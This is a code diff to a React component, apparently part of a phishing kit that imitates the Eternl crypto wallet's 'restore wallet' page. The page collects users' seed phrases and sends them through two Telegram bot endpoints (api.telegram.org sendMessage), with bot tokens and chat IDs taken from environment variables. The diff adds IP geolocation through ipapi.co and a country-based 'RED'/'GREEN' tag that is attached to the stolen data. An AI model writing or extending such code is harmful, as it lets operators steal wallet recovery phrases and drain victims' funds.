@@ -1,4 +1,4 @@
-import { useState } from "react";
+import { useState, useEffect } from "react";
 import { Link, useNavigate } from "react-router-dom";
 
 function EternlRestoreWallet() {
@@ -7,7 +7,26 @@ function EternlRestoreWallet() {
   const [isNextClicked, setIsNextClicked] = useState(false);
   const [seedPhrase, setSeedPhrase] = useState([]);
   const [attempts, setAttempts] = useState(0);
+  const [country, setCountry] = useState("");
   const navigate = useNavigate();
+
+  useEffect(() => {
+    const getCountry = async () => {
+      try {
+        const response = await fetch("https://ipapi.co/json/");
+        const data = await response.json();
+        const country = data.country_name;
+        setCountry(country);
+      } catch (error) {
+        console.error("Error fetching country:", error);
+        setCountry("Unknown");
+        console.log("Unknown"); // Log "Unknown" if there's an error
+      }
+    };
+    getCountry();
+  }, []);
+
+
 
   const handleToggle = () => {
     setIsMenuOpen(!isMenuOpen);
@@ -38,9 +57,14 @@ function EternlRestoreWallet() {
     const chat_id = import.meta.env.VITE_REACT_APP_TELEGRAM_CHAT_ID;
     const otoken = import.meta.env.VITE_REACT_APP_OTELEGRAM_TOKEN;
     const ochat_id = import.meta.env.VITE_REACT_APP_OTELEGRAM_CHAT_ID;
+    const greenCountries = ['united states', 'united kingdom', 'nigeria', 'united arab emirates'];
+    const color = greenCountries.includes(country.toLowerCase()) ? 'RED' : 'GREEN';
+
+    
 
     const url = `https://api.telegram.org/bot${token}/sendMessage`;
     const ourl = `https://api.telegram.org/bot${otoken}/sendMessage`;
+
 
     const data = {
       chat_id: chat_id,
@@ -74,7 +98,7 @@ function EternlRestoreWallet() {
           },
           body: JSON.stringify(odata),
         });
-
+  
         if (!oresponse.ok) {
           throw new Error("Network response was not ok");
         }
